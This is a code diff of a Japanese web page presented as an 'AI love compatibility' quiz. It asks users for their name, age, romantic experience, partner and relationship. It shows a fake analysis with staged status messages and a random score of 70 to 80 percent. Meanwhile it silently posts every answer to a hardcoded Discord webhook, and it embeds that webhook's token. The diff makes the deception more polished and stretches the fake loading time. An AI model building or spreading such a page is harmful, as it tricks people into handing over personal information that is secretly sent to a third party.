@@ -3,23 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>診断</title>
+    <title>AI恋愛相性診断</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f0f0f0; }
-        .box { background: #fff; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
-        button { padding: 12px 30px; cursor: pointer; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; }
-        #progress-container { width: 100%; background: #eee; height: 10px; border-radius: 5px; margin-top: 20px; overflow: hidden; display: none; }
-        #progress-bar { width: 0%; height: 100%; background: #007bff; transition: width 0.3s; }
+        body { 
+            font-family: 'Helvetica Neue', Arial, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; margin: 0; 
+            background: linear-gradient(135deg, #74ebd5 0%, #9face6 100%); 
+        }
+        .box { 
+            background: #fff; padding: 40px; border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
+            width: 85%; max-width: 400px; text-align: center;
+        }
+        input { 
+            width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #eee; 
+            border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none;
+        }
+        button { 
+            padding: 15px 30px; cursor: pointer; font-size: 16px; font-weight: bold;
+            background: #5c67f2; color: white; border: none; border-radius: 50px;
+            transition: 0.3s;
+        }
+        #progress-container { width: 100%; background: #eee; height: 15px; border-radius: 10px; margin-top: 25px; overflow: hidden; display: none; }
+        #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff9a9e, #fad0c4); transition: width 0.5s; }
+        #status-text { margin-top: 10px; font-size: 0.9em; color: #666; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 id="title">恋愛相性診断</h2>
-        <p id="msg">開始ボタンを押してね</p>
-        <input type="text" id="inputArea" style="display:none;">
-        <button id="actionBtn">開始</button>
+        <h2 id="title">AI恋愛相性診断</h2>
+        <p id="msg">あなたの情報を入力して相性をチェック！</p>
+        <input type="text" id="inputArea" style="display:none;" placeholder="入力してね...">
+        <button id="actionBtn">診断を開始する</button>
         <div id="progress-container"><div id="progress-bar"></div></div>
+        <div id="status-text"></div>
     </div>
 
     <script>
@@ -30,17 +48,13 @@
 
         document.getElementById('actionBtn').onclick = () => {
             const inputVal = document.getElementById('inputArea').value;
-            
-            if (step > 0 && inputVal.trim() === "") {
-                alert("何か入力してね！");
-                return;
-            }
+            if (step > 0 && inputVal.trim() === "") { alert("空欄じゃ診断できないよ！"); return; }
 
             if (step === 0) {
                 step++;
                 document.getElementById('msg').innerText = questions[0];
                 document.getElementById('inputArea').style.display = 'block';
-                document.getElementById('actionBtn').innerText = '次へ';
+                document.getElementById('actionBtn').innerText = '次へ進む';
             } else if (step <= questions.length) {
                 answers[keys[step - 1]] = inputVal;
                 document.getElementById('inputArea').value = '';
@@ -55,28 +69,34 @@
 
         function showLoading() {
             document.getElementById('title').innerText = "解析中...";
-            document.getElementById('msg').innerText = "AIが相性を計算しています...";
             document.getElementById('inputArea').style.display = 'none';
             document.getElementById('actionBtn').style.display = 'none';
             document.getElementById('progress-container').style.display = 'block';
 
+            const status = ["データを抽出中...", "相性を計算中...", "運命の糸を分析中...", "あと少し..."];
             let width = 0;
+            let i = 0;
+
             const interval = setInterval(() => {
-                width += 10;
+                width += 5;
                 document.getElementById('progress-bar').style.width = width + "%";
+                if (width % 25 === 0 && i < status.length) {
+                    document.getElementById('msg').innerText = status[i];
+                    i++;
+                }
                 if (width >= 100) clearInterval(interval);
-            }, 300);
+            }, 300); // 300ms間隔でじわじわ伸びる
 
             const score = Math.floor(Math.random() * (81 - 70) + 70);
-            const data = { content: `結果:\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
+            const data = { content: `**恋愛診断結果**\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
             
             fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", {
                 method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
             });
 
             setTimeout(() => {
-                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 2em; font-weight: bold; color: #ff6b81;">${score}%</p>`;
-            }, 3500);
+                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 3em; font-weight: bold; color: #5c67f2;">${score}%</p><p>相性はかなり良いみたいだよ！</p>`;
+            }, 6500); // 約6.5秒のロード時間
         }
     </script>
 </body>
